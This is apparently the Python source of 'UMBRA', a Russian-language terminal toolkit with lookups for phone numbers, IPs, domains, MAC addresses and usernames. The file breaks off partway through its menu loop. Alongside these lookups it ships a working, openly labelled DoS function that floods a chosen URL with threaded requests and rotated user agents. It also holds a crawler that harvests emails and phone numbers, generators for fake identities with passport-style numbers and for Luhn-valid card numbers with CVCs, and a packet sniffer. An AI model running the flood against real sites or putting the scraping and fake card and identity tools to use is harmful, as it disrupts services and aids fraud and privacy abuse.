import phonenumbers
from phonenumbers import geocoder, carrier, PhoneNumberType, number_type
import requests
import re
from colorama import init, Fore, Style
import colorsys
from bs4 import BeautifulSoup
from urllib.parse import quote, urlparse, urljoin
import json
import time
import threading
import random
import os
import shutil
import whois
from whois import whois as whois_lookup
import socket
from datetime import datetime, timedelta
import string
from faker import Faker
from scapy.all import *
import ssl
import curses
from ipwhois import IPWhois
from ipwhois.exceptions import IPDefinedError


init(autoreset=True)
fake = Faker('ru_RU')
ORANGE = "\033[38;5;208m"
art = """         
██╗   ██╗███╗   ███╗██████╗ ██████╗  █████╗ 
██║   ██║████╗ ████║██╔══██╗██╔══██╗██╔══██╗
██║   ██║██╔████╔██║██████╔╝██████╔╝███████║
██║   ██║██║╚██╔╝██║██╔══██╗██╔══██╗██╔══██║
╚██████╔╝██║ ╚═╝ ██║██████╔╝██║  ██║██║  ██║
 ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
"""

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def print_manual():
    manual_text = f"""{Fore.LIGHTYELLOW_EX}
==================== MANUAL ====================

  Программа UMBRA предназначена для:
  ▸ Информационного поиска
  ▸ Тестирования безопасности
  ▸ Демонстрации возможностей Python

  Эта утилита не является игрушкой.
  Используйте её **только** в учебных и этичных целях.
  Не пытайтесь применять на чужих данных, серверах или системах.

  Управление:
  [1-12]  — Выбор пунктов меню
  [13]    - Теневой (фиолетовый) инструмент
  [14]    - Кибербезопасный (синий) инструмент
  [15]    - Пасхалка (по паролю) (голубой)
  [16]    - Мощный тул (оранжевый)
  [q]     — Выход из программы
  [h]     — Вызов этого мануала

  Подсказка:
  → Вводите данные аккуратно. Убедитесь в их корректности.
  → Некоторые функции требуют интернет-соединения.

{Fore.RED}
  АВТОР НЕ НЕСЁТ ЗА ВАС ОТВЕТСТВЕННОСТЬ!!!
  ВСЯ ОТВЕТСТВЕННОСТЬ ЗА ИСПОЛЬЗОВАНИЕ — НА ВАС.

{Fore.LIGHTYELLOW_EX}
================= UMBRA =========================
"""
    print(manual_text)

def rgb_to_ansi(r, g, b):
    return f"\033[38;2;{r};{g};{b}m"

def gradient_ascii(text, gradient="default"):
    presets = {
        "default": [
            196, 202, 208, 214, 220, 190, 154,
            118, 82, 46, 47, 48, 49, 50, 51, 45, 39,
            33, 27, 21, 57, 93, 129, 165
        ],
        "galaxy": [18, 19, 20, 21, 57, 93, 129, 165, 201, 207, 213],
        "sunset": [202, 208, 214, 177, 141, 99, 57],
        "toxic": [22, 28, 34, 40, 46, 82, 118],
        "berry": [89, 125, 161, 197, 199, 201, 207, 213],
        "dark": [232, 233, 234, 235, 236, 237, 238, 239],
        "dragon": [88, 124, 160, 196, 202, 226],
    }

    gradient_colors = presets.get(gradient, presets["default"])
    result = ""
    color_count = len(gradient_colors)
    char_index = 0

    for line in text.splitlines():
        for char in line:
            color_code = gradient_colors[char_index % color_count]
            result += f"\033[38;5;{color_code}m{char}"
            char_index += 1
        result += "\n"
    result += Style.RESET_ALL
    return result

def analyze_phone_number(phone_str, default_region='RU'):
    raw = re.sub(r'[^\d+]', '', phone_str)

    emergency_numbers = {
        "112": "Единый номер службы спасения",
        "911": "Полиция / Скорая / Пожарные (США)",
        "101": "Пожарная служба (Россия)",
        "102": "Полиция (Россия)",
        "103": "Скорая помощь (Россия)",
        "104": "Аварийная газовая служба (Россия)"
    }
    if raw in emergency_numbers:
        print(Fore.GREEN + f"[+] Номер: {raw}")
        print(Fore.CYAN + "[+] Тип: Экстренная служба")
        print(Fore.CYAN + f"[+] Описание: {emergency_numbers[raw]}")
        return None

    try:
        number = phonenumbers.parse(raw, default_region)
        if not phonenumbers.is_valid_number(number):
            print(Fore.RED + "[-] Номер невалидный")
            return None

        formatted = phonenumbers.format_number(number, phonenumbers.PhoneNumberFormat.INTERNATIONAL)
        
        # 2. Географическое расположение (город/регион)
        location = geocoder.description_for_number(number, "ru") or "Не определено"
        
        # 3. Оператор связи
        operator = carrier.name_for_number(number, "ru") or "Не определен"

        # Тип номера
        num_type = number_type(number)
        typemap = {
            PhoneNumberType.MOBILE: "Мобильный",
            PhoneNumberType.FIXED_LINE: "Стационарный",
            PhoneNumberType.TOLL_FREE: "Бесплатный",
            PhoneNumberType.PREMIUM_RATE: "Премиум",
            PhoneNumberType.VOIP: "VoIP",
            PhoneNumberType.SHARED_COST: "Совместная оплата",
            PhoneNumberType.PAGER: "Пейджер",
            PhoneNumberType.UAN: "UAN",
            PhoneNumberType.VOICEMAIL: "Голосовая почта",
        }
        type_str = typemap.get(num_type, "Неизвестен")

        print(Fore.GREEN + f"[+] Номер: {formatted}")
        print(Fore.CYAN + f"[+] Тип: {type_str}")
        print(Fore.YELLOW + f"[+] Страна: {location}")
        print(Fore.MAGENTA + f"[+] Оператор: {operator}")

        return formatted
    except phonenumbers.NumberParseException:
        print(Fore.RED + "[-] Неверный формат номера")
        return None

def is_private_ip(ip):
    try:
        # Попытка получить whois, если IP приватный, будет исключение
        IPWhois(ip).lookup_rdap(depth=0)
        return False
    except IPDefinedError:
        return True
    except Exception:
        # Если IP некорректный или другая ошибка — считаем не приватным
        return False

def get_ip_geolocation(ip):
    url = f"http://ip-api.com/json/{ip}?lang=ru"
    try:
        response = requests.get(url, timeout=5)
        data = response.json()
        if data.get("status") == "success":
            return data
        else:
            return None
    except requests.RequestException:
        return None

def analyze_ip(ip):
    if is_private_ip(ip):
        print(Fore.YELLOW + "[!] Внимание: Это приватный IP-адрес. Геоданные могут быть неточными или отсутствовать.")
    else:
        print(Fore.GREEN + f"[+] IP адрес: {ip}")

    geo = get_ip_geolocation(ip)
    if geo:
        print(Fore.CYAN + f"[+] Страна: {geo.get('country', 'Неизвестно')}")
        print(Fore.CYAN + f"[+] Регион: {geo.get('regionName', 'Неизвестно')}")
        print(Fore.CYAN + f"[+] Город: {geo.get('city', 'Неизвестно')}")
        print(Fore.CYAN + f"[+] Провайдер: {geo.get('isp', 'Неизвестно')}")
        print(Fore.CYAN + f"[+] Широта: {geo.get('lat', 'Неизвестно')}")
        print(Fore.CYAN + f"[+] Долгота: {geo.get('lon', 'Неизвестно')}")
    else:
        print(Fore.RED + "[-] Не удалось получить геоданные для этого IP.")

    if not is_private_ip(ip):
        try:
            whois = IPWhois(ip).lookup_rdap(depth=1)
            nets = whois.get('nets', [])
            if nets:
                net = nets[0]
                print(Fore.MAGENTA + "[+] Whois информация:")
                print(Fore.MAGENTA + f"    Название сети: {net.get('name', 'Неизвестно')}")
                print(Fore.MAGENTA + f"    Организация: {net.get('org', 'Неизвестно')}")
                print(Fore.MAGENTA + f"    CIDR: {net.get('cidr', 'Неизвестно')}")
                print(Fore.MAGENTA + f"    Контакт: {net.get('contact', 'Неизвестно')}")
            else:
                print(Fore.RED + "[-] Whois-информация отсутствует.")
        except Exception:
            print(Fore.RED + "[-] Не удалось получить whois-информацию для этого IP.")

def run_dos(num_requests, url, delay=0.1):
    if not url:
        print("[-] Ошибка: URL не может быть пустым.")
        return

    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
    ]

    success_count = 0
    fail_count = 0
    lock = threading.Lock()

    def send_request(i):
        nonlocal success_count, fail_count
        user_agent = random.choice(user_agents)
        headers = {"User-Agent": user_agent}
        try:
            response = requests.get(url, headers=headers, timeout=5)
            with lock:
                success_count += 1
            print(Fore.GREEN + f"[+] Запрос #{i} успешно отправлен.")
        except requests.RequestException:
            with lock:
                fail_count += 1
            print(Fore.RED + f"[-] Запрос #{i} не удался.")

        time.sleep(delay)

    threads = []
    os.system("clear")
    print(Fore.YELLOW + f"[!] Запускается DoS-атака: всего запросов — {num_requests}, задержка между ними — {delay} сек.\n")

    for i in range(1, num_requests + 1):
        t = threading.Thread(target=send_request, args=(i,))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    total = success_count + fail_count
    os.system("clear")
    print(Fore.CYAN + "\n[!] Статистика атаки:")
    print(Fore.CYAN + f"[@] Всего отправлено запросов: {total}")
    print(Fore.GREEN + f"[+] Успешных запросов: {success_count}")
    print(Fore.RED + f"[-] Неудачных запросов: {fail_count}")

def crawl_website(start_url, max_depth=2):
    visited = set()
    found_emails = set()
    found_phones = set()

    def normalize_phone(phone):
        phone = re.sub(r"[^\d+]", "", phone)
        if phone.startswith("8") and len(phone) == 11:
            phone = "+7" + phone[1:]
        elif phone.startswith("9") and len(phone) == 10:
            phone = "+7" + phone
        elif phone.startswith("0") or len(phone) < 7:
            return None
        return phone

    def crawl(url, depth=0):
        if depth > max_depth or url in visited:
            return

        try:
            print(Fore.YELLOW + f"[~] Пытаюсь подключиться к: {url}")
            headers = {"User-Agent": "Mozilla/5.0"}
            response = requests.get(url, headers=headers, timeout=5)
            if response.status_code != 200:
                print(Fore.RED + f"[!] Ответ: {response.status_code} — Пропущено.")
                return
            soup = BeautifulSoup(response.text, "html.parser")
        except Exception as e:
            print(Fore.RED + f"[!] Ошибка запроса: {url} ({e})")
            return

        visited.add(url)
        print(Fore.CYAN + f"[+] Сканирование: {url}")

        page_text = soup.get_text()

        emails = re.findall(r"[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+", page_text)
        for email in set(emails):
            if email not in found_emails:
                print(Fore.BLUE + f"[*] Найден email: {email}")
                found_emails.add(email)

        # Поиск телефонов
        raw_phones = re.findall(
            r"(\+7|8)?[\s\-()]*(\d{3})[\s\-()]*(\d{3})[\s\-()]*(\d{2})[\s\-()]*(\d{2})", 
            page_text
        )
        for phone_tuple in set(raw_phones):
            phone = ''.join(phone_tuple)
            phone = normalize_phone(phone)
            if phone and phone not in found_phones and not re.match(r"^(\d)\1{6,}$", phone):
                print(Fore.BLUE + f"[*] Найден номер: {phone}")
                found_phones.add(phone)

        base_domain = urlparse(start_url).netloc
        for link in soup.find_all("a", href=True):
            href = urljoin(url, link['href'].split('#')[0])
            parsed_href = urlparse(href)
            if parsed_href.netloc == base_domain and href not in visited:
                crawl(href, depth + 1)

    if not start_url.startswith("http://") and not start_url.startswith("https://"):
        start_url = "http://" + start_url

    print(Fore.YELLOW + "\n[~] Запуск краулера...\n")
    crawl(start_url)
    print(Fore.GREEN + "\n[✓] Сканирование завершено.")
    print(Fore.CYAN + f"[=] Найдено email'ов: {len(found_emails)}")
    print(Fore.CYAN + f"[=] Найдено номеров телефонов: {len(found_phones)}")

def format_date(d):
    if isinstance(d, list):
        d = d[0]  # берем первый элемент, если это список
    if isinstance(d, datetime):
        return d.strftime("%Y-%m-%d %H:%M:%S")
    return str(d)

def analyze_domain(domain):
    print(Fore.YELLOW + f"\n[~] Анализ домена: {domain}\n")

    try:
        info = whois_lookup(domain)

        # Регистратор
        registrar = info.registrar or "Неизвестно"

        # Страна
        country = info.country or "Не указана"

        # Дата регистрации и окончания
        created = format_date(info.creation_date) if info.creation_date else "Неизвестно"
        expires = format_date(info.expiration_date) if info.expiration_date else "Неизвестно"

        # Email администратора
        email = info.emails[0] if isinstance(info.emails, list) else info.emails or "Не найден"

        # DNS
        dns_servers = info.name_servers or 'Не найдены'

        # IP адрес
        try:
            ip_addr = socket.gethostbyname(domain)
        except:
            ip_addr = Fore.YELLOW + "Не удалось определить"

        # Вывод
        print(Fore.GREEN + f"[+] Домен зарегистрирован у: {registrar}")
        print(Fore.CYAN + f"[+] Страна: {country}")
        print(Fore.MAGENTA + f"[+] Дата создания: {created}")
        print(Fore.MAGENTA + f"[+] Дата окончания: {expires}")
        print(Fore.BLUE + f"[+] Контактный email: {email}")
        print(Fore.BLUE + f"[+] DNS сервера: {dns_servers}")
        print(Fore.BLUE + f"[+] IP адрес: {ip_addr}")

    except Exception as e:
        print(Fore.RED + f"[-] Ошибка при получении информации: {e}")

def search_username(username):
    platforms = {
        "Telegram": f"https://t.me/{username}",
        "TikTok": f"https://www.tiktok.com/@{username}",
        "VK": f"https://vk.com/{username}",
        "Discord": f"https://discordapp.com/users/{username}",
        "Twitter": f"https://twitter.com/{username}",
        "Twitch": f"https://www.twitch.tv/{username}",
    }

    for platform, url in platforms.items():
        try:
            response = requests.get(url, timeout=5)
            if response.status_code == 200:
                print(Fore.GREEN + f"[+] Найдено в {platform}: {url}")
            elif response.status_code == 404:
                print(Fore.RED + f"[-] Аккаунт не найден в {platform}")
            else:
                print(Fore.YELLOW + f"[!] Странный ответ с {platform} ({response.status_code}), проверьте ссылку сами: {url}")
        except requests.RequestException:
            print(Fore.YELLOW + f"[!] Ошибка при подключении к {platform}, проверьте ссылку сами: {url}")

def generate_fake_identity():
    # Генерация фейковых данных
    gender = random.choice(['мужчина', 'женщина'])
    name = fake.name_male() if gender == 'мужчина' else fake.name_female()
    birthdate = fake.date_of_birth(minimum_age=18, maximum_age=65)
    city = fake.city()
    country = fake.current_country()
    address = fake.address()
    phone = fake.phone_number()
    email = fake.email()
    username = fake.user_name()
    password = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
    passport = f"{random.randint(1000, 9999)} {random.randint(100000, 999999)}"
    snils = f"{random.randint(100000000, 999999999)}"
    inn = f"{random.randint(1000000000, 9999999999)}"

    # Составление фейковых данных в словарь
    identity = {
        "ФИО": name,
        "Пол": gender,
        "Дата рождения": str(birthdate),
        "Город": city,
        "Страна": country,
        "Адрес": address,
        "Телефон": phone,
        "Email": email,
        "Username": username,
        "Пароль": password,
        "Паспорт": passport,
        "СНИЛС": snils,
        "ИНН": inn
    }

    # Вывод с раскраской
    for key, value in identity.items():
        if key == "ФИО":
            print(Fore.GREEN + f"[+] {key}: {value}")
        elif key == "Пол":
            print(Fore.CYAN + f"[+] {key}: {value}")
        elif key == "Дата рождения":
            print(Fore.YELLOW + f"[+] {key}: {value}")
        elif key == "Город":
            print(Fore.MAGENTA + f"[+] {key}: {value}")
        elif key == "Страна":
            print(Fore.BLUE + f"[+] {key}: {value}")
        elif key == "Адрес":
            print(Fore.WHITE + f"[+] {key}: {value}")
        elif key == "Телефон":
            print(Fore.RED + f"[+] {key}: {value}")
        elif key == "Email":
            print(Fore.LIGHTCYAN_EX + f"[+] {key}: {value}")
        elif key == "Username":
            print(Fore.LIGHTMAGENTA_EX + f"[+] {key}: {value}")
        elif key == "Пароль":
            print(Fore.LIGHTYELLOW_EX + f"[+] {key}: {value}")
        elif key == "Паспорт":
            print(Fore.LIGHTGREEN_EX + f"[+] {key}: {value}")
        elif key == "СНИЛС":
            print(Fore.LIGHTWHITE_EX + f"[+] {key}: {value}")
        elif key == "ИНН":
            print(Fore.LIGHTBLUE_EX + f"[+] {key}: {value}")

def generate_card_number(prefix='400000', length=16, exp_years=3):
    number = [int(x) for x in prefix]
    while len(number) < length - 1:
        number.append(random.randint(0, 9))

    def luhn_checksum(num_list):
        s = 0
        for i in range(len(num_list) - 1, -1, -1):
            digit = num_list[i]
            if (len(num_list) - i) % 2 == 1:
                s += digit
            else:
                doubled = digit * 2
                s += doubled - 9 if doubled > 9 else doubled
        return s % 10

    checksum = luhn_checksum(number + [0])
    check_digit = (10 - checksum) % 10
    number.append(check_digit)

    card_number = ''.join(map(str, number))
    formatted_number = ' '.join(card_number[i:i+4] for i in range(0, len(card_number), 4))

    expire_date = (datetime.now() + timedelta(days=365 * exp_years)).strftime("%m/%y")
    cvc = random.randint(100, 999)

    print(Fore.LIGHTGREEN_EX + f"[+] Номер: {formatted_number}")
    print(Fore.LIGHTCYAN_EX + f"[+] Годен до: {expire_date}")
    print(Fore.LIGHTBLUE_EX + f"[+] CVC/CVV: {cvc}")

def mac_lookup(mac_address):
    def is_valid_mac(mac):
        # Проверка формата MAC-адреса (XX:XX:XX:XX:XX:XX)
        return bool(re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", mac))

    def is_local_mac(mac):
        # Проверка локального MAC (2-й младший бит первого октета)
        # Преобразуем первый октет из HEX в int
        first_octet = int(mac.split(":")[0], 16)
        # Проверяем 2-й младший бит (bit 1)
        return (first_octet & 2) != 0

    if not is_valid_mac(mac_address):
        print(Fore.RED + "[!] Неверный формат MAC-адреса. Пример: 00:1A:2B:3C:4D:5E" + Style.RESET_ALL)
        return

    if is_local_mac(mac_address):
        print(Fore.YELLOW + "[!] Внимание: Это локальный MAC-адрес (локальная сеть)." + Style.RESET_ALL)
    else:
        print(Fore.CYAN + "[+] Это глобальный MAC-адрес." + Style.RESET_ALL)

    api_url = f"https://api.macvendors.com/{mac_address}"
    try:
        response = requests.get(api_url, timeout=5)
        if response.status_code == 200:
            vendor = response.text.strip()
            print(Fore.GREEN + f"[+] Производитель: {vendor}" + Style.RESET_ALL)
        elif response.status_code == 404:
            print(Fore.YELLOW + "[!] Производитель не найден (404)" + Style.RESET_ALL)
        else:
            print(Fore.RED + f"[!] Ошибка API: {response.status_code} - {response.text}" + Style.RESET_ALL)
    except requests.RequestException as e:
        print(Fore.RED + f"[!] Ошибка соединения: {str(e)}" + Style.RESET_ALL)

def generate_user_agents(count):
    versions = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{0}.0) Gecko/{0}{1:02d} Firefox/{0}.0",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:{0}.0) Gecko/{0}{1:02d} Firefox/{0}.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.{0}; rv:{1}.0) Gecko/20{2:02d}{3:02d} Firefox/{1}.0",
        "Mozilla/5.0 (X11; Linux x86_64; rv:{0}.0) Gecko/{0}{1:02d} Firefox/{0}.0",
    ]

    # Ограничение по count
    count = max(1, min(count, 10))

    for _ in range(count):
        template = random.choice(versions)
        if template.startswith("Mozilla/5.0 (Macintosh"):
            ua = template.format(
                random.randint(0, 15),
                random.randint(50, 99),
                random.randint(15, 23),
                random.randint(1, 12),
            )
        else:
            ua = template.format(
                random.randint(50, 99),
                random.randint(1, 30),
            )
        print(Fore.LIGHTYELLOW_EX + "[+]" + ua + Style.RESET_ALL)

def port_scanner():
    ports = [
        20, 21, 22, 23, 25, 26, 28, 29, 53, 55, 80, 110, 111, 135, 139, 143,
        443, 445, 8080, 1020, 1111, 1388, 2222, 3306, 3389, 4040, 5432, 5900,
        6000, 6035, 8081, 8888, 9000,
    ]
    ip = '127.0.0.1'

    print(Fore.YELLOW + "[~] Начинаю сканирование портов...")

    for port in ports:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(0.5)
            result = sock.connect_ex((ip, port))
            if result == 0:
                print(Fore.GREEN + f"[+] Порт {port} — открыт")
            else:
                print(Fore.RED + f"[-] Порт {port} — закрыт")

def shadow_network_monitor(interface):
    last_packet_str = None

    def packet_handler(pkt):
        nonlocal last_packet_str
        if pkt.haslayer(TCP) and pkt.haslayer(IP):
            ip_src = pkt[IP].src
            ip_dst = pkt[IP].dst
            sport = pkt[TCP].sport
            dport = pkt[TCP].dport
            flags = pkt[TCP].flags

            # В scapy 2.4.5 flags — это числовая битовая маска
            TCP_FIN = 0x01
            TCP_SYN = 0x02
            TCP_RST = 0x04
            TCP_PSH = 0x08
            TCP_ACK = 0x10

            fin_set = (flags & TCP_FIN) != 0
            syn_set = (flags & TCP_SYN) != 0
            rst_set = (flags & TCP_RST) != 0
            psh_set = (flags & TCP_PSH) != 0
            ack_set = (flags & TCP_ACK) != 0

            flag_desc = ""
            color = Fore.WHITE

            if psh_set and ack_set:
                flag_desc = "PA (Push+ACK)"
                color = Fore.LIGHTMAGENTA_EX
            elif ack_set and not psh_set and not syn_set and not fin_set and not rst_set:
                flag_desc = "A (ACK)"
                color = Fore.LIGHTCYAN_EX
            elif syn_set:
                flag_desc = "SYN (start)"
                color = Fore.LIGHTBLUE_EX
            elif fin_set:
                flag_desc = "FIN (finish)"
                color = ORANGE
            elif rst_set:
                flag_desc = "RST (reset)"
                color = Fore.LIGHTRED_EX
            else:
                flags_list = []
                if fin_set: flags_list.append("F")
                if syn_set: flags_list.append("S")
                if rst_set: flags_list.append("R")
                if psh_set: flags_list.append("P")
                if ack_set: flags_list.append("A")
                flag_desc = "FLAGS: " + "".join(flags_list)
                color = Fore.LIGHTGREEN_EX

            packet_str = f"{color}[{flag_desc}] {ip_src}:{sport}  -->  {ip_dst}:{dport}"

            if packet_str != last_packet_str:
                print(packet_str)
                last_packet_str = packet_str

    try:
        print(Fore.MAGENTA + f"Запуск теневого мониторинга на интерфейсе {interface}... (Ctrl+C для остановки)")
        sniff(iface=interface, prn=packet_handler, store=False)
    except PermissionError:
        print(Fore.RED + "[!] Недостаточно прав (запустись с правами админа или через sudo)...")
        return

def cybersec_scan(url):
    parsed = urlparse(url)
    host = parsed.hostname
    scheme = parsed.scheme
    port = parsed.port or (443 if scheme == 'https' else 80)
    
    print(f"{Fore.CYAN}[+] Начинаем сканирование {url}{Style.RESET_ALL}\n")

    # Проверка HTTPS и SSL-сертификата
    if scheme == 'https':
        try:
            context = ssl.create_default_context()
            with socket.create_connection((host, 443), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=host) as ssock:
                    cert = ssock.getpeercert()
                    exp_date = datetime.strptime(cert['notAfter'], "%b %d %H:%M:%S %Y %Z")
                    print(f"{Fore.GREEN}[+] HTTPS: Используется")
                    print(f"{Fore.GREEN}[+] SSL-сертификат: Действителен до {exp_date.date()}")
        except Exception as e:
            print(f"{Fore.RED}[!] SSL-проверка не удалась: {e}")
    else:
        print(f"{Fore.RED}[!] HTTPS не используется")

    # Запрос главной страницы
    try:
        r = requests.get(url, timeout=7)
        headers = r.headers

        print(f"\n{Fore.LIGHTYELLOW_EX}[~] Проверка HTTP заголовков безопасности:")
        def check_header(name, good_desc):
            if name in headers:
                print(f"{Fore.GREEN}[+] {name}: Найден ({headers[name]})")
            else:
                print(f"{Fore.LIGHTYELLOW_EX}[!] {name}: Отсутствует — {good_desc}")

        check_header('Content-Security-Policy', 'Рекомендуется для защиты от XSS')
        check_header('Strict-Transport-Security', 'Обеспечивает HSTS')
        check_header('X-Frame-Options', 'Защита от clickjacking')
        check_header('X-Content-Type-Options', 'Блокирует MIME-sniffing')
        check_header('Referrer-Policy', 'Контроль над Referer-заголовком')
        check_header('Permissions-Policy', 'Ограничивает доступ к API браузера\n')
    
    except Exception as e:
        print(f"{Fore.RED}[!] Ошибка запроса к сайту: {e}")

def theater_of_shadows(stdscr):
    curses.curs_set(0)  # Скрыть курсор
    stdscr.nodelay(True)
    stdscr.timeout(100)

    height, width = stdscr.getmaxyx()

    stars = []
    colors = [curses.COLOR_MAGENTA, curses.COLOR_WHITE, curses.COLOR_CYAN]

    curses.start_color()
    for i, color in enumerate(colors, 1):
        curses.init_pair(i, color, curses.COLOR_BLACK)

    # Создаем несколько звёзд с рандомными позициями и направлениями движения
    for _ in range(30):
        x = random.randint(1, width - 2)
        y = random.randint(1, height - 2)
        dx = random.choice([-1, 1])
        dy = random.choice([-1, 1])
        color = random.randint(1, len(colors))
        stars.append([y, x, dy, dx, color])

    while True:
        stdscr.clear()
        for star in stars:
            y, x, dy, dx, color = star

            # Отрисовка звезды
            stdscr.addstr(y, x, "*", curses.color_pair(color))

            # Обновление позиции
            y_new = y + dy
            x_new = x + dx

            # Проверка границ
            if y_new <= 0 or y_new >= height - 1:
                dy *= -1
            if x_new <= 0 or x_new >= width - 1:
                dx *= -1

            star[0], star[1], star[2], star[3] = y + dy, x + dx, dy, dx

        stdscr.refresh()
        time.sleep(0.1)

        # Прерывание по нажатию любой клавиши
        if stdscr.getch() != -1:
            break

def orange_scout_gather(domain: str) -> dict:
    result = {}
    try:
        w = whois_lookup(domain)
        result['whois'] = {
            'domain_name': w.domain_name,
            'registrar': w.registrar,
            'creation_date': w.creation_date,
            'expiration_date': w.expiration_date,
            'name_servers': w.name_servers,
            'emails': w.emails,
        }
    except Exception as e:
        result['whois'] = f"Ошибка WHOIS: {e}"

    try:
        ip = socket.gethostbyname(domain)
        result['ip'] = ip

        obj = IPWhois(ip)
        ipwhois_res = obj.lookup_rdap(depth=1)

        result['ipwhois'] = {
            'network_name': ipwhois_res['network']['name'],
            'country': ipwhois_res['network']['country'],
            'org': ipwhois_res['network']['remarks'][0]['description'] if ipwhois_res['network']['remarks'] else None,
            'cidr': ipwhois_res['network']['cidr'],
        }

        geo_res = requests.get(f"http://ip-api.com/json/{ip}").json()
        result['geolocation'] = {
            'country': geo_res.get('country'),
            'region': geo_res.get('regionName'),
            'city': geo_res.get('city'),
            'isp': geo_res.get('isp'),
        }

    except Exception as e:
        result['ipwhois'] = f"Ошибка IPWhois/Geo: {e}"

    try:
        search_url = f"https://www.google.com/search?q=site:{domain}"
        headers = {'User-Agent': 'Mozilla/5.0'}
        r = requests.get(search_url, headers=headers)
        titles = []
        if r.status_code == 200:
            titles = re.findall(r'<h3.*?>(.*?)</h3>', r.text)[:3]
        result['google_search_titles'] = titles
    except Exception as e:
        result['google_search_titles'] = f"Ошибка поиска: {e}"

    print(ORANGE + "\n[OrangeScout] Визуализация связей:\n")
    print(Fore.LIGHTCYAN_EX + f"Домен: {domain}")
    if 'ip' in result:
        print(Fore.LIGHTMAGENTA_EX + f"  └── IP: {result['ip']}")
        if 'ipwhois' in result and isinstance(result['ipwhois'], dict):
            country = result['ipwhois'].get('country')
            print(Fore.LIGHTYELLOW_EX + f"       └── Страна: {country}")
            org = result['ipwhois'].get('org')
            if org:
                print(Fore.LIGHTGREEN_EX + f"       └── Организация: {org}")
    print()

    return result

def pretty_print_report(data: dict):
    print(ORANGE + "\nСобранные данные:\n" + "="*40)

    for section, content in data.items():
        print(Fore.LIGHTCYAN_EX + f"\n--- {section.upper()} ---")
        
        if isinstance(content, dict):
            for key, value in content.items():
                print(Fore.LIGHTGREEN_EX + f"{key.capitalize().replace('_', ' ')}: {value}")
        elif isinstance(content, list):
            if not content:
                print(Fore.RED + "Нет данных.")
            else:
                for idx, item in enumerate(content, start=1):
                    print(Fore.LIGHTMAGENTA_EX + f"{idx}. {item}")
        else:
            print(content)

    print("="*40 + "\n")

def main():
    clear()

    presets = {
        "default": [
            196, 202, 208, 214, 220, 190, 154,
            118, 82, 46, 47, 48, 49, 50, 51, 45, 39,
            33, 27, 21, 57, 93, 129, 165
        ],
        "galaxy": [18, 19, 20, 21, 57, 93, 129, 165, 201, 207, 213],
        "sunset": [202, 208, 214, 177, 141, 99, 57],
        "toxic": [22, 28, 34, 40, 46, 82, 118],
        "berry": [89, 125, 161, 197, 199, 201, 207, 213],
        "dark": [232, 233, 234, 235, 236, 237, 238, 239],
        "dragon": [88, 124, 160, 196, 202, 226],
    }
    prompt = f"""
[1] Поиск по номеру телефона               [9] Генератор вымышленной карты\n
[2] Поиск по IP адресу                    [10] Поиск по Mac-Address\n
[3] DoS атака                             [11] Генерация User-Agent\n
[4] Web Crawler                           [12] Сканирование портов\n
[5] Поиск по сайту                        {Fore.MAGENTA}[13] Мониторинг сетевого трафика\n{Fore.LIGHTGREEN_EX}
[6] Поиск по нику                         {Fore.LIGHTBLUE_EX}[14] Анализ кибербезопасности сайта\n {Fore.LIGHTGREEN_EX}
[7] Генератор вымышленной личности        {Fore.LIGHTCYAN_EX}[15] Театр теней\n{Fore.LIGHTGREEN_EX}
[8] Банворд Umbra                         {ORANGE}[16] Сбор данных по домену\n
               {Fore.LIGHTRED_EX}[q] Выход       {Fore.LIGHTYELLOW_EX}[h] Мануал Umbra{Fore.LIGHTGREEN_EX}
"""
    while True:
        print(gradient_ascii(art, gradient="toxic"))
        choice = input(Fore.LIGHTGREEN_EX + prompt + "\n" + "Ваш выбор: ").strip().lower()

        if choice == 'q':
            print(Fore.LIGHTYELLOW_EX + "Выход из программы. Пока!")
            break
        elif choice == 'h':
            print_manual()
            input(Fore.LIGHTYELLOW_EX + "Нажмите любую клавишу для продолжения...")
            clear()

        elif choice == '1':
            phone_input = input(Style.BRIGHT + "Введите номер телефона: ").strip()
            analyze_phone_number(phone_input)
            input(Fore.LIGHTYELLOW_EX + "Нажмите любую клавишу для продолжения...")
            clear()

        elif choice == '2':
            ip_input = input(Style.BRIGHT + "Введите IP адрес: ").strip()
            analyze_ip(ip_input)
            input(Fore.LIGHTYELLOW_EX + "Нажмите любую клавишу для продолжения...")
            clear()

        elif choice == '3':
            while True:
                url = input(Style.BRIGHT + "Введите URL для атаки: ").strip()
                if not url.startswith("http://") and not url.startswith("https://"):
                    print(Fore.YELLOW + "[!] Это невалидная ссылка. Начинай с http:// или https://")
                    continue
                break
            while True:
                num_requests_input = input(Style.BRIGHT + "Введите количество запросов (максимум 1000): ").strip()
                try:
                    num_requests = int(num_requests_input)
                    if num_requests > 1000:
                        print(Fore.YELLOW + "[!] Установленное число больше 1000, ставлю 1000")
                        num_requests = 1000
                    break
                except ValueError:
                    print(Fore.RED + "[!] Введи именно число")
            run_dos(num_requests, url, delay=0.1)
            input(Fore.LIGHTYELLOW_EX + "Нажмите любую клавишу для продолжения...")
            clear()

        elif choice == '4':
            url = input(Style.BRIGHT + "Введите URL для поиска: ")
            if not url.startswith("http://") and not url.startswith("https://"):
                print(Fore.YELLOW + "[!] Это невалидная ссылка. Начинай с http:// или https://")
                print(Fore.LIGHTYELLOW_EX + "Очистка экрана через 3 сек...")
                time.sleep(3)
                clear()
                continue
